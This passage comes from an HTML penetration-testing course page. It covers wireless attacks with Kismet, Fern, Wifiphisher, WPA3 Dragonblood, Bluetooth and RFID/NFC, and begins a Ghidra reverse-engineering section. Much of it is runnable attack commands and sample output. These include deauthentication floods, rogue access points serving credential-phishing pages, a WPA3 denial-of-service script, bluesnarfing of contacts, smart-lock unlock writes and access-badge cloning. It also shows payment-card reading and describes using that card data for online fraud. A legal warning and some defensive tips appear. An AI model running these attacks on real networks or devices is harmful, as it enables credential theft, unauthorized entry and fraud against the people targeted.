                ‚Ä¢ Dow Jones (2017): Public S3 bucket = 2.2M customer records exposed<br>
                ‚Ä¢ Tesla (2018): Public Kubernetes dashboard = cryptomining in cloud<br><br>
                <strong>Practice resources:</strong><br>
                ‚Ä¢ <strong>CloudGoat:</strong> Vulnerable-by-design AWS environment<br>
                ‚Ä¢ <strong>flAWS.cloud:</strong> AWS security challenges<br>
                ‚Ä¢ <strong>AWSGoat:</strong> Vulnerable AWS infrastructure<br>
                ‚Ä¢ <strong>GCP-Goat:</strong> Vulnerable GCP environment<br><br>
                Cloud security is THE fastest-growing pentesting specialty. Companies are desperate for people who understand IAM, storage permissions, and cloud-native security. Master this = job security for life! ‚òÅÔ∏èüîê</p>
            </div>
        </section>

        <section id="advanced-wireless" class="section">
            <h2 class="section-title">Advanced Wireless Techniques</h2>
            <p class="section-intro">Wireless networks are everywhere‚Äîinvisible highways carrying data through the air. WiFi at coffee shops, Bluetooth headphones, RFID access badges, NFC payment cards, ZigBee smart home devices, 433MHz garage door openers... every wireless protocol is a potential attack vector. In Bonus B1, we covered basic WiFi hacking (aircrack-ng, airodump-ng, WPA cracking). Now we go DEEP: advanced monitoring with Kismet, social engineering attacks with Wifiphisher, WPA3 cracking, Bluetooth exploitation, RFID cloning, and radio frequency analysis. This section transforms you from WiFi script kiddie to wireless penetration expert!</p>

            <div class="metaphor-box">
                <h4>üí° Wireless Hacking = Being an Invisible Spy</h4>
                <p>Imagine the air around you is filled with invisible conversations. Every WiFi network, Bluetooth device, and RFID card is constantly broadcasting. Traditional hackers need physical access or internet connections. Wireless hackers just need to be nearby!<br><br>
                <strong>With the right tools, you can:</strong><br>
                ‚Ä¢ Listen to WiFi handshakes from 100+ meters away<br>
                ‚Ä¢ Capture Bluetooth keyboard keystrokes<br>
                ‚Ä¢ Clone RFID access badges by walking past someone<br>
                ‚Ä¢ Intercept car key fob signals and replay them<br>
                ‚Ä¢ Create fake WiFi networks that look legitimate<br>
                ‚Ä¢ Jam wireless signals to cause denial of service<br><br>
                Wireless hacking is powerful because victims don't know they're being attacked. No cables, no physical access, no traces!</p>
            </div>

            <h3>Part 1: Kismet - Advanced WiFi/Bluetooth Detection & Monitoring</h3>

            <p><strong>Kismet</strong> is a powerful wireless network detector, sniffer, and intrusion detection system. Unlike airodump-ng (which focuses on one network at a time), Kismet passively monitors ALL wireless traffic on all channels simultaneously!</p>

            <div class="info-box">
                <h4>Why Kismet > airodump-ng?</h4>
                <p><strong>Kismet advantages:</strong><br>
                ‚Ä¢ <strong>Channel hopping:</strong> Monitors all WiFi channels at once (airodump-ng locks to one)<br>
                ‚Ä¢ <strong>Web interface:</strong> Beautiful real-time dashboard with graphs and maps<br>
                ‚Ä¢ <strong>Bluetooth support:</strong> Detects BLE, BTLE, and classic Bluetooth<br>
                ‚Ä¢ <strong>GPS integration:</strong> Maps access point locations (wardriving!)<br>
                ‚Ä¢ <strong>Historical data:</strong> Tracks networks over time, detects patterns<br>
                ‚Ä¢ <strong>Plugin system:</strong> Extensible with Python plugins<br>
                ‚Ä¢ <strong>Hidden SSID detection:</strong> Reveals hidden networks via client probes<br>
                ‚Ä¢ <strong>Rogue AP detection:</strong> Identifies evil twin attacks<br><br>
                <strong>Use airodump-ng for:</strong> Targeted attacks on specific networks<br>
                <strong>Use Kismet for:</strong> Passive reconnaissance, wardriving, comprehensive monitoring</p>
            </div>

            <h4>Installing Kismet</h4>

            <div class="code"># Kismet comes with Kali, but here's how to update:
sudo apt update
sudo apt install kismet

# Verify installation:
kismet --version

# Output:
# Kismet 2024.07.01

# Add your user to kismet group (avoid running as root):
sudo usermod -aG kismet $USER

# Log out and back in for group change to take effect

# Start Kismet:
kismet

# Output:
# INFO: Kismet starting...
# INFO: Creating web server on http://localhost:2501
# INFO: Kismet server listening on http://localhost:2501
# 
# Open your browser to: http://localhost:2501</div>

            <h4>Kismet Web Interface Walkthrough</h4>

            <div class="code"># When you open http://localhost:2501:

# First-time setup:
# 1. Create admin user and password
# 2. Select data sources (WiFi adapters)

# Main Dashboard shows:
# ‚Ä¢ Total networks detected
# ‚Ä¢ Total devices detected
# ‚Ä¢ Channel distribution graph
# ‚Ä¢ Signal strength over time
# ‚Ä¢ Recent activity feed

# Key tabs:

# 1. DEVICES tab:
# Shows all detected WiFi networks and clients
# Columns:
#   - Name (SSID)
#   - Type (AP, Client, Bridge)
#   - Channel
#   - Encryption (WPA2, WPA3, Open)
#   - Signal strength
#   - First seen / Last seen
#   - Manufacturer (from MAC OUI)

# Click any device to see detailed info:
#   - Full MAC address
#   - Beacon frames captured
#   - Data packets
#   - Connected clients
#   - GPS coordinates (if GPS enabled)
#   - Historical signal strength graph

# 2. CHANNEL USAGE:
# Shows which channels are most crowded
# Helps identify least-used channels for attacks

# 3. DATASOURCES:
# Manage WiFi adapters
# Add/remove interfaces
# See packet capture rates

# 4. PLUGINS:
# Enable/disable Kismet plugins
# Install new plugins

# 5. ALERTS:
# Security alerts:
#   - Rogue AP detected
#   - Deauth flood detected
#   - GPS spoofing detected
#   - Bluetooth scanning attacks</div>

            <h4>Kismet Command-Line Usage</h4>

            <div class="code"># Start Kismet with specific adapter:
kismet -c wlan0

# Start with multiple adapters:
kismet -c wlan0 -c wlan1

# Enable GPS:
kismet -c wlan0 --use-gpsd

# Specify output directory:
kismet -c wlan0 --log-prefix /root/kismet-logs/

# Run in quiet mode (no web interface):
kismet -c wlan0 --no-ncurses --no-webui

# Capture only specific channels:
kismet -c wlan0:channels="1,6,11"

# Capture 5GHz only:
kismet -c wlan0:channels="36,40,44,48"

# Set GPS location manually (no GPS device):
kismet -c wlan0 --override-gps-lat 40.7128 --override-gps-lon -74.0060

# Enable Bluetooth:
kismet -c hci0:name=bluetooth

# All wireless protocols at once:
kismet -c wlan0 -c hci0</div>

            <h4>Wardriving with Kismet</h4>

            <div class="code"># Wardriving = driving around mapping WiFi networks

# Hardware needed:
# ‚Ä¢ Laptop with Kali
# ‚Ä¢ High-gain WiFi adapter (Alfa AWUS036ACH recommended)
# ‚Ä¢ GPS dongle (GlobalSat BU-353 or phone GPS via Bluetooth)
# ‚Ä¢ Car power inverter or large battery pack

# Setup GPS:
# Install gpsd:
sudo apt install gpsd gpsd-clients

# Connect GPS dongle, then:
sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock

# Verify GPS:
cgps

# You should see satellites and coordinates

# Start Kismet with GPS:
kismet -c wlan0 --use-gpsd

# Drive around for hours!
# Kismet logs everything to: ~/.kismet/logs/

# After wardriving session:
# Kismet creates files:
#   - Kismet-YYYYMMDD-HH-MM-SS-1.kismet (database)
#   - Kismet-YYYYMMDD-HH-MM-SS-1.pcapng (packet capture)
#   - Kismet-YYYYMMDD-HH-MM-SS-1.log (text log)

# Convert Kismet logs to KML (Google Earth):
kismetdb_to_kml --in Kismet-20260108-10-00-00-1.kismet --out networks.kml

# Open in Google Earth to see all networks on map!

# Export to CSV for analysis:
kismetdb_to_csv --in Kismet-20260108-10-00-00-1.kismet --out networks.csv

# Analyze CSV with Python/Excel:
# Find most common SSIDs, weakest encryption, high-value targets</div>

            <h4>Detecting Hidden SSIDs with Kismet</h4>

            <div class="code"># Many networks hide their SSID (not broadcast in beacons)
# But clients constantly probe for known networks!

# In Kismet web interface:
# 1. Look for networks with SSID: "<Hidden SSID>"
# 2. Click the network
# 3. Go to "Client Devices" tab
# 4. Watch for probe requests

# Clients send: "Is [NetworkName] here? Is [NetworkName] here?"
# Kismet captures these probes and reveals the SSID!

# Example:
# Hidden network at MAC: AA:BB:CC:DD:EE:FF
# Client probes: "Is HomeNetwork here?"
# ‚Üí Kismet updates: AA:BB:CC:DD:EE:FF = "HomeNetwork"

# Force faster revelation:
# Deauth clients from the hidden network
# They'll immediately probe to reconnect!

aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Within seconds, Kismet reveals the hidden SSID</div>

            <h3>Part 2: Fern WiFi Cracker - GUI-Based WiFi Hacking</h3>

            <p><strong>Fern WiFi Cracker</strong> is a graphical tool that automates WiFi security testing. It's essentially a GUI wrapper around aircrack-ng suite, making attacks point-and-click easy!</p>

            <div class="code"># Install Fern:
sudo apt install fern-wifi-cracker

# Or from GitHub:
git clone https://github.com/savio-code/fern-wifi-cracker.git
cd fern-wifi-cracker
sudo python3 execute.py

# Launch Fern:
sudo fern-wifi-cracker

# Main interface:
# 1. Select WiFi interface (wlan0)
# 2. Click "Scan for Access Points"
# 3. Choose WEP or WPA/WPA2 tab
# 4. Select target network
# 5. Click attack type:
#    - WEP: Fake authentication, ARP replay, caffe-latte
#    - WPA: Handshake capture, deauth attack
# 6. Provide wordlist for cracking
# 7. Click "WiFi Attack"

# Fern automatically:
# ‚úÖ Enables monitor mode
# ‚úÖ Captures handshake
# ‚úÖ Deauths clients
# ‚úÖ Cracks password
# ‚úÖ Displays results

# Features:
# ‚Ä¢ Automatic attack selection (best for each encryption)
# ‚Ä¢ Built-in wordlist manager
# ‚Ä¢ Session management (resume attacks)
# ‚Ä¢ Ethernet attacks (ARP spoofing, DNS spoofing)
# ‚Ä¢ Credential harvester (fake login pages)

# Limitations:
# ‚Ä¢ Not as flexible as manual aircrack-ng
# ‚Ä¢ Slower than command-line tools
# ‚Ä¢ Less control over parameters

# Best use: Quick audits, demos, teaching beginners</div>

            <h3>Part 3: Wifiphisher - Social Engineering WiFi Attacks</h3>

            <p><strong>Wifiphisher</strong> is a rogue access point framework for automated phishing attacks against WiFi users. It creates fake access points, jams the real network, and serves credential-stealing web pages!</p>

            <div class="metaphor-box">
                <h4>üí° Wifiphisher = The WiFi Con Artist</h4>
                <p>Imagine you're at a coffee shop. The WiFi is "CoffeeShop_Guest". Suddenly:<br><br>
                1. Your connection drops (Wifiphisher jamming real AP)<br>
                2. You see "CoffeeShop_Guest" again, connect<br>
                3. Browser opens: "Firmware Update Required - Enter WiFi Password to Continue"<br>
                4. You type your password...<br>
                5. Attacker now has the WPA password!<br><br>
                Wifiphisher automates this entire attack: jam ‚Üí fake AP ‚Üí phishing page ‚Üí capture credentials!</p>
            </div>

            <div class="code"># Install Wifiphisher:
sudo apt install wifiphisher

# Or from GitHub:
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher
sudo python3 setup.py install

# Basic attack (automated):
sudo wifiphisher

# Wifiphisher will:
# 1. Scan for networks
# 2. Display list of APs
# 3. You select target
# 4. Wifiphisher jams target AP
# 5. Creates fake AP with same SSID
# 6. Serves phishing page

# Manual mode (more control):
sudo wifiphisher -aI wlan0 -jI wlan1 -e "TargetNetwork"

# -aI wlan0    ‚Üí Access point interface (creates fake AP)
# -jI wlan1    ‚Üí Jamming interface (deauths real AP)
# -e "TargetNetwork" ‚Üí Target SSID

# Built-in phishing scenarios:

# 1. Firmware Upgrade (most believable):
sudo wifiphisher -aI wlan0 -jI wlan1 -e "TargetNetwork" -p firmware-upgrade

# Page says: "Router firmware update required. Enter WiFi password to continue."

# 2. Browser Plugin Update:
sudo wifiphisher -p plugin_update

# Page says: "Browser plugin outdated. Install update to continue."
# Downloads malware!

# 3. OAuth Login:
sudo wifiphisher -p oauth-login

# Fake Google/Facebook login page

# 4. Network Manager Connect:
sudo wifiphisher -p network_manager_connect

# Looks like Linux network manager asking for password

# Custom phishing pages:
# Create HTML page: /etc/wifiphisher/phishing-pages/custom/
sudo mkdir -p /etc/wifiphisher/phishing-pages/custom-page/
sudo nano /etc/wifiphisher/phishing-pages/custom-page/index.html

# Use this template:
# <!DOCTYPE html>
# <html>
# <body>
#   <h1>IT Department Notice</h1>
#   <p>Your access credentials have expired.</p>
#   <form method="POST" action="/phishing/password">
#     <input type="password" name="password" placeholder="WiFi Password">
#     <button type="submit">Verify</button>
#   </form>
# </body>
# </html>

# Use custom page:
sudo wifiphisher -p custom-page

# Captured credentials saved to:
# /root/wifiphisher-credentials.txt

# Check results:
cat /root/wifiphisher-credentials.txt

# Output:
# [2026-01-08 14:30:22] Password: MySecretWiFi123
# [2026-01-08 14:32:15] Password: CompanyWiFi2026</div>

            <h4>Advanced Wifiphisher Techniques</h4>

            <div class="code"># Evil Twin + Captive Portal (no jamming):
sudo wifiphisher --nojoammer -e "FreeWiFi" -p firmware-upgrade

# Creates open "FreeWiFi" network
# When users connect, captive portal asks for "verification"
# Perfect for conferences, airports, hotels

# HTTPS phishing (SSL strip):
sudo wifiphisher --sslstrip

# Strips HTTPS from websites
# Shows padlock but serves HTTP
# Captures passwords from HTTPS sites!

# Known beacons attack:
sudo wifiphisher --knownbeacons

# Creates multiple fake APs with common SSIDs:
# - "Free WiFi"
# - "Airport WiFi"
# - "Starbucks"
# - "Hotel Guest"
# Devices auto-connect if they've seen these before!

# Handshake capture mode:
sudo wifiphisher --handshake

# Captures WPA handshakes instead of phishing
# Good for cracking passwords offline later

# Logging and verbosity:
sudo wifiphisher -v -l /tmp/wifiphisher.log

# -v = verbose output
# -l = log file location</div>

            <div class="warning-box">
                <h4>‚ö†Ô∏è Wifiphisher Legal Warning</h4>
                <p><strong>CRITICAL:</strong> Wifiphisher creates rogue access points and harvests credentials. This is ILLEGAL without authorization!<br><br>
                <strong>Authorized use cases ONLY:</strong><br>
                ‚Ä¢ Pentesting engagements with written permission<br>
                ‚Ä¢ Red team exercises on company networks<br>
                ‚Ä¢ Security awareness training (with user consent)<br>
                ‚Ä¢ Personal lab networks<br><br>
                <strong>NEVER use on public networks, coffee shops, airports, or any network you don't own/have permission to test!</strong><br><br>
                Penalties can include:<br>
                ‚Ä¢ Computer fraud charges<br>
                ‚Ä¢ Identity theft charges<br>
                ‚Ä¢ Wire fraud charges<br>
                ‚Ä¢ 10+ years prison in many jurisdictions<br><br>
                Use responsibly. You've been warned! üö®</p>
            </div>

            <h3>Part 4: WPA3 Security & Attacks</h3>

            <p><strong>WPA3</strong> is the latest WiFi security standard (2018+), designed to fix WPA2 weaknesses. But it's not invulnerable!</p>

            <h4>WPA3 Improvements Over WPA2</h4>

            <div class="info-box">
                <h4>What Makes WPA3 Better?</h4>
                <p><strong>1. SAE (Simultaneous Authentication of Equals):</strong><br>
                Replaces WPA2's 4-way handshake with Dragonfly key exchange<br>
                ‚Ä¢ Protects against offline dictionary attacks<br>
                ‚Ä¢ Forward secrecy (past traffic stays encrypted even if password compromised)<br><br>
                <strong>2. Protection Against Deauth Attacks:</strong><br>
                Management frame protection (802.11w) mandatory<br>
                ‚Ä¢ Deauth frames must be encrypted and authenticated<br>
                ‚Ä¢ Can't use aireplay-ng --deauth anymore!<br><br>
                <strong>3. Individualized Data Encryption:</strong><br>
                Each device gets unique encryption key<br>
                ‚Ä¢ In WPA2, all devices share group key<br>
                ‚Ä¢ In WPA3, sniffing one device doesn't reveal others<br><br>
                <strong>4. Easy Connect (WPA3-Easy):</strong><br>
                QR code pairing for IoT devices<br>
                ‚Ä¢ No more "12345678" default passwords<br><br>
                <strong>5. 192-bit Security Suite:</strong><br>
                Optional enterprise mode with stronger crypto<br>
                ‚Ä¢ GCMP-256 encryption<br>
                ‚Ä¢ BIP-GMAC-256 management frame protection</p>
            </div>

            <h4>WPA3 Vulnerabilities - Dragonblood Attacks</h4>

            <div class="code"># WPA3 has known vulnerabilities discovered in 2019-2020:
# "Dragonblood" attacks by Mathy Vanhoef

# Vulnerability categories:

# 1. Timing-based side-channel attack
# Attacker can recover password by measuring how long authentication takes
# Requires being very close to AP (same room)
# Exploits: Some WPA3 implementations leak password info via timing

# 2. Downgrade attack
# Force WPA3 AP to use WPA2 "transition mode"
# Then attack with traditional WPA2 methods!

# Detection:
airodump-ng wlan0mon

# Look for "WPA2 WPA3" in ENC column = vulnerable to downgrade!

# Attack:
# Use wpa_supplicant to force WPA2 connection:
wpa_supplicant -i wlan0 -c wpa2_only.conf

# wpa2_only.conf:
# network={
#   ssid="TargetNetwork"
#   key_mgmt=WPA-PSK
#   psk="test"
# }

# 3. Denial of Service
# Send invalid SAE frames to crash AP
# Tool: Dragonblood PoC scripts

git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Run DoS attack:
./dragonslayer.py wlan0 --target AA:BB:CC:DD:EE:FF --dos

# 4. Cache-based side-channel (CVE-2019-9494)
# Recover password via CPU cache timing
# Highly complex, mostly theoretical

# Current state of WPA3 attacks:
# ‚ùå Can't capture handshake and crack offline (main win for WPA3!)
# ‚úÖ Can downgrade to WPA2 on some APs
# ‚úÖ Can DoS the network
# ‚ö†Ô∏è Side-channel attacks possible but difficult

# Best attack vector: Social engineering (Wifiphisher!)
# WPA3 doesn't stop users from typing password into fake portal!</div>

            <h3>Part 5: Bluetooth Exploitation</h3>

            <h4>Bluetooth Basics for Hackers</h4>

            <div class="code"># Bluetooth has two main versions:
# ‚Ä¢ Bluetooth Classic (BR/EDR) - keyboards, headsets, file transfer
# ‚Ä¢ Bluetooth Low Energy (BLE/BTLE) - fitness trackers, IoT devices

# Install Bluetooth tools:
sudo apt install bluez bluez-tools

# List Bluetooth adapters:
hciconfig

# Output:
# hci0:   Type: Primary  Bus: USB
#         BD Address: 00:11:22:33:44:55  ACL MTU: 1021:8  SCO MTU: 64:1
#         UP RUNNING
#         RX bytes:1234 acl:10 sco:0 events:56 errors:0
#         TX bytes:5678 acl:10 sco:0 commands:45 errors:0

# Enable Bluetooth adapter:
sudo hciconfig hci0 up

# Scan for nearby Bluetooth devices:
sudo hcitool scan

# Output:
# Scanning ...
#     AA:BB:CC:DD:EE:FF       John's iPhone
#     11:22:33:44:55:66       Bose Headphones
#     77:88:99:AA:BB:CC       Samsung Galaxy

# Get detailed device info:
sudo hcitool info AA:BB:CC:DD:EE:FF

# Output:
# Requesting information ...
#     BD Address:  AA:BB:CC:DD:EE:FF
#     Device Name: John's iPhone
#     LMP Version: 5.0 (0x9) LMP Subversion: 0x4321
#     Manufacturer: Apple (76)

# BLE scan:
sudo hcitool lescan

# Output:
# LE Scan ...
# AA:BB:CC:DD:EE:FF Fitbit Charge 5
# 11:22:33:44:55:66 (unknown)
# 77:88:99:AA:BB:CC Mi Band 6</div>

            <h4>Bluetooth Attacks with Bluepot & Redfang</h4>

            <div class="code"># Redfang - Find hidden Bluetooth devices
# (Devices in "non-discoverable" mode)

git clone https://github.com/mister-espria/redfang.git
cd redfang
./redfang

# Brute-forces MAC addresses to find hidden devices
# Useful for finding devices that don't respond to hcitool scan

# Bluepot - Bluetooth honeypot
# Simulates vulnerable Bluetooth device to catch attackers

git clone https://github.com/andrewmichaelsmith/bluepot.git
cd bluepot
sudo python bluepot.py

# Creates fake vulnerable device
# Logs connection attempts
# Identifies attacking tools

# Bluesnarfing - Steal data from device
# (Works on old devices with OBEX vulnerabilities)

sudo apt install obexftp

# Connect and list files:
obexftp -b AA:BB:CC:DD:EE:FF -l

# Download contacts:
obexftp -b AA:BB:CC:DD:EE:FF -g telecom/pb.vcf

# Download calendar:
obexftp -b AA:BB:CC:DD:EE:FF -g telecom/cal.vcs

# Bluejacking - Send unsolicited messages
# (Harmless but annoying)

ussp-push AA:BB:CC:DD:EE:FF@10 message.txt message.txt

# Sends message.txt to device
# User sees: "Incoming file: message.txt"</div>

            <h4>BLE Hacking with Gatttool & BLESuite</h4>

            <div class="code"># BLE uses GATT (Generic Attribute Profile)
# Devices expose "services" with "characteristics" (data fields)

# Connect to BLE device:
gatttool -b AA:BB:CC:DD:EE:FF -I

# Interactive mode:
[AA:BB:CC:DD:EE:FF][LE]> connect
Attempting to connect to AA:BB:CC:DD:EE:FF
Connection successful

# List services:
[AA:BB:CC:DD:EE:FF][LE]> primary
attr handle: 0x0001, end grp handle: 0x0007 uuid: 00001800-0000-1000-8000-00805f9b34fb
attr handle: 0x0008, end grp handle: 0x000b uuid: 00001801-0000-1000-8000-00805f9b34fb
attr handle: 0x000c, end grp handle: 0xffff uuid: 0000180f-0000-1000-8000-00805f9b34fb

# List characteristics:
[AA:BB:CC:DD:EE:FF][LE]> characteristics
handle: 0x0002, char properties: 0x02, char value handle: 0x0003, uuid: 00002a00-0000-1000-8000-00805f9b34fb
handle: 0x0004, char properties: 0x02, char value handle: 0x0005, uuid: 00002a01-0000-1000-8000-00805f9b34fb

# Read characteristic:
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
Characteristic value/descriptor: 46 69 74 62 69 74 20 43 68 61 72 67 65

# (Hex decodes to: "Fitbit Charge")

# Write to characteristic:
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0010 01

# Might trigger action (turn on LED, change setting, etc.)

# BLESuite - More advanced BLE exploitation:
git clone https://github.com/nccgroup/BLESuite.git
cd BLESuite
sudo python3 setup.py install

# Scan and identify BLE devices:
ble-scan

# Enumerate GATT services:
ble-read -a AA:BB:CC:DD:EE:FF

# Smart lock exploit example:
# Many smart locks have "unlock" characteristic
# Find it, write 0x01, door unlocks!

# Fitness tracker exploit:
# Read heart rate, steps, location history
# Privacy nightmare!</div>

            <h3>Part 6: RFID/NFC Hacking</h3>

            <h4>Understanding RFID & NFC</h4>

            <div class="info-box">
                <h4>RFID vs NFC</h4>
                <p><strong>RFID (Radio Frequency Identification):</strong><br>
                ‚Ä¢ Long range (up to 100 meters for active tags)<br>
                ‚Ä¢ Used for: Access badges, inventory tracking, toll collection<br>
                ‚Ä¢ Frequencies: 125kHz (low), 13.56MHz (high), 900MHz (ultra-high)<br><br>
                <strong>NFC (Near Field Communication):</strong><br>
                ‚Ä¢ Short range (< 10cm)<br>
                ‚Ä¢ Based on 13.56MHz RFID<br>
                ‚Ä¢ Used for: Contactless payments, phone pairing, smart posters<br>
                ‚Ä¢ Two-way communication (RFID is usually one-way)<br><br>
                <strong>Why they're vulnerable:</strong><br>
                ‚Ä¢ No encryption on basic tags (125kHz)<br>
                ‚Ä¢ Easily cloned with $20 device<br>
                ‚Ä¢ Can be read from distance (RFID)<br>
                ‚Ä¢ Replay attacks possible</p>
            </div>

            <h4>RFID Cloning with Proxmark3</h4>

            <div class="code"># Proxmark3 - Professional RFID research tool (~$300)
# Can read, clone, and emulate RFID/NFC tags

# Budget alternative: ACR122U NFC reader (~$40)

# Reading 125kHz RFID card (HID Prox):
proxmark3> lf hid fskdemod

# Output:
# TAG ID: 2004e11e (printed on card)
# Full: 10004e11e (with site code)

# Clone to writable T5577 card:
proxmark3> lf hid clone 2004e11e

# Output:
# Cloning tag to T5577
# Writing block 0
# Writing block 1
# Done!

# The cloned card now works as the original!

# Reading 13.56MHz RFID/NFC (Mifare Classic):
proxmark3> hf mf chk *1 ?

# Output:
# Checking keys...
# Sector 0: Key A: FFFFFFFFFFFF (default key found!)
# Sector 1: Key A: FFFFFFFFFFFF
# [most keys are still factory default!]

# Dump entire card:
proxmark3> hf mf dump

# Creates: dumpdata.bin

# Clone to blank Mifare card:
proxmark3> hf mf restore

# Write dumpdata.bin to new card
# Perfect clone!

# NFC credit card reading:
proxmark3> hf 14a reader

# Output:
# UID: 01 02 03 04
# ATQA: 00 04
# SAK: 08 [Mifare Classic]

# Some credit cards expose:
# ‚Ä¢ Card number (PAN)
# ‚Ä¢ Expiry date
# ‚Ä¢ Cardholder name
# ‚Ä¢ Recent transaction history

# Note: Can't withdraw money (CVV not on chip)
# But: Can use for online fraud if no 2FA!</div>

            <h4>Budget RFID Hacking - ACR122U</h4>

            <div class="code"># ACR122U is USB NFC reader/writer (~$40)
# Works with libnfc

# Install libnfc:
sudo apt install libnfc-bin libnfc-examples

# List readers:
nfc-list

# Output:
# NFC device: ACS ACR122U opened

# Scan for tags:
nfc-poll

# Output when card near:
# NFC target found:
#     UID: 01 02 03 04
#     ATQA: 00 04
#     SAK: 08

# Read Mifare Classic card:
nfc-mfclassic r a dump.mfd

# Requires: Mifare Classic card
# Output: dump.mfd (full card data)

# Write to blank card:
nfc-mfclassic w a dump.mfd

# Clone complete!

# Emulate tag (turn ACR122U into virtual card):
nfc-emulate-tag

# Your reader now pretends to be a tag
# Can simulate access badge without carrying it!

# Android phone NFC hacking:
# Install: "NFC Tools" app (free)
# Can read/write NFC tags
# Limited compared to Proxmark3, but portable!</div>

            <div class="metaphor-box">
                <h4>üéâ You're a Wireless Penetration Master!</h4>
                <p>You've conquered:<br><br>
                ‚úÖ <strong>Kismet:</strong> Advanced WiFi monitoring, wardriving, hidden SSID detection<br>
                ‚úÖ <strong>Fern WiFi Cracker:</strong> GUI-based automated WiFi attacks<br>
                ‚úÖ <strong>Wifiphisher:</strong> Rogue AP + social engineering credential theft<br>
                ‚úÖ <strong>WPA3:</strong> Understanding improvements, Dragonblood attacks, limitations<br>
                ‚úÖ <strong>Bluetooth:</strong> Classic & BLE hacking, GATT enumeration, smart device exploits<br>
                ‚úÖ <strong>RFID/NFC:</strong> Proxmark3 cloning, access badge duplication, credit card reading<br><br>
                <strong>Wireless Attack Surface:</strong><br>
                ‚Ä¢ <strong>WiFi:</strong> WPA2 handshakes, WPA3 downgrades, evil twin APs<br>
                ‚Ä¢ <strong>Bluetooth:</strong> BLE smart locks, fitness trackers, car key fobs<br>
                ‚Ä¢ <strong>RFID:</strong> 125kHz access badges, 13.56MHz transit cards<br>
                ‚Ä¢ <strong>NFC:</strong> Contactless payment cards, phone pairing<br>
                ‚Ä¢ <strong>433MHz:</strong> Garage doors, car remotes, weather stations (SDR topic)<br>
                ‚Ä¢ <strong>ZigBee:</strong> Smart home devices (requires KillerBee tools)<br><br>
                <strong>Defense strategies:</strong><br>
                ‚Ä¢ Use WPA3 with strong passwords (16+ chars)<br>
                ‚Ä¢ Disable WPS, disable WPA2 transition mode<br>
                ‚Ä¢ Enable 802.11w (management frame protection)<br>
                ‚Ä¢ Use wired connections for critical systems<br>
                ‚Ä¢ Shield RFID badges (Faraday sleeves)<br>
                ‚Ä¢ Monitor for rogue APs (Kismet!)<br><br>
                Wireless hacking is one of the most exciting pentesting domains because it's invisible, long-range, and often underestimated by defenders. Companies spend millions on firewalls but leave WiFi wide open! üì°üîì</p>
            </div>
        </section>

        <!-- SECTION 6: Reverse Engineering Mastery -->
        <section id="reverse-engineering" class="section">
            <h2 class="section-title">Reverse Engineering Mastery</h2>
            <p class="section-intro">Reverse engineering is digital archaeology. Someone gave you a compiled binary‚Äîmachine code that CPUs understand but humans can't read. Your mission: understand what it does, find vulnerabilities, bypass protections, extract secrets. Whether you're analyzing malware, cracking software, finding 0-days, or understanding proprietary protocols, reverse engineering is THE skill that separates script kiddies from elite hackers. This section covers Ghidra (NSA's free RE tool), radare2 (command-line beast), Binary Ninja (modern platform), GDB debugging, ELF analysis (Linux), and PE analysis (Windows). By the end, you'll read assembly like English!</p>

            <div class="metaphor-box">
                <h4>üí° Reverse Engineering = Reading Someone's Mind</h4>
                <p>Imagine someone hands you a locked box with no documentation. Inside are gears, circuits, and mechanisms. Your job:<br><br>
                1. <strong>Static analysis:</strong> Take it apart without turning it on (disassembly)<br>
                2. <strong>Dynamic analysis:</strong> Run it and observe behavior (debugging)<br>
                3. <strong>Decompilation:</strong> Reconstruct the original blueprints (C code from assembly)<br><br>
                <strong>Why reverse engineer?</strong><br>
                ‚Ä¢ <strong>Security:</strong> Find vulns in closed-source software<br>
                ‚Ä¢ <strong>Malware analysis:</strong> Understand what virus does<br>
                ‚Ä¢ <strong>Cracking:</strong> Bypass license checks, DRM<br>
                ‚Ä¢ <strong>Interoperability:</strong> Make different systems work together<br>
                ‚Ä¢ <strong>Learning:</strong> See how experts write optimized code<br>
                ‚Ä¢ <strong>Protocol reverse engineering:</strong> Understand proprietary network protocols<br><br>
                Every binary tells a story. Your job is to read it! üìñüîç</p>
            </div>

            <h3>Part 1: Ghidra - NSA's Reverse Engineering Framework</h3>

            <p><strong>Ghidra</strong> (pronounced "GEE-druh") is a FREE, open-source software reverse engineering suite developed by the NSA and released publicly in 2019. It rivals $10,000+ commercial tools like IDA Pro!</p>

            <h4>Installing & Launching Ghidra</h4>

            <div class="code"># Ghidra requires Java JDK 11+
sudo apt update
sudo apt install openjdk-17-jdk

# Download Ghidra from:
# https://ghidra-sre.org/

# Or install via Kali repo:
sudo apt install ghidra

# Launch Ghidra:
ghidra

# First launch creates:
# ~/.ghidra/ (settings and projects)

# Create new project:
# File ‚Üí New Project ‚Üí Non-Shared Project
# Name: MyReverseEngineering
# Location: /root/ghidra_projects/

# Import binary:
# File ‚Üí Import File ‚Üí Select binary (e.g., /bin/ls)
# Ghidra auto-detects:
#   - Format: ELF, PE, Mach-O, etc.
#   - Architecture: x86, x64, ARM, MIPS, etc.
#   - Endianness: Little, Big
# Click OK

# Analyze binary:
# Analysis ‚Üí Auto Analyze
# Check all options:
#   ‚úÖ Decompiler Parameter ID
#   ‚úÖ Function Start Search
#   ‚úÖ Stack
#   ‚úÖ Reference
#   ‚úÖ Embedded Media
#   ‚úÖ Create Address Tables
#   ‚úÖ ASCII Strings
# Click Analyze (takes 30 seconds to few minutes)

# Ghidra now shows:
# ‚Ä¢ All functions (left panel)
# ‚Ä¢ Disassembly (middle panel)
# ‚Ä¢ Decompiled C code (right panel)</div>

            <h4>Ghidra Interface Walkthrough</h4>

            <div class="code"># Main Ghidra window sections:

# 1. Program Trees (left)
# Shows binary structure:
#   - .text (code)
#   - .data (initialized data)
#   - .rodata (read-only data like strings)
#   - .bss (uninitialized data)

# 2. Symbol Tree (left, different tab)
# Lists all functions:
#   - Functions
#   - Labels
#   - Classes (C++ binaries)
#   - Namespaces

# 3. Listing (center)
# Disassembly view:
# Address | Bytes | Mnemonic | Operands
# 00401000 | 55 | PUSH | EBP
# 00401001 | 89 e5 | MOV | EBP, ESP
# 00401003 | 83 ec 10 | SUB | ESP, 0x10

# 4. Decompiler (right)
# Pseudo-C code:
# void main(void) {
#   int local_10;
#   local_10 = 0;
#   printf("Hello World\n");
#   return;
# }

# 5. Data Type Manager (bottom left)
# Shows structs, enums, typedefs

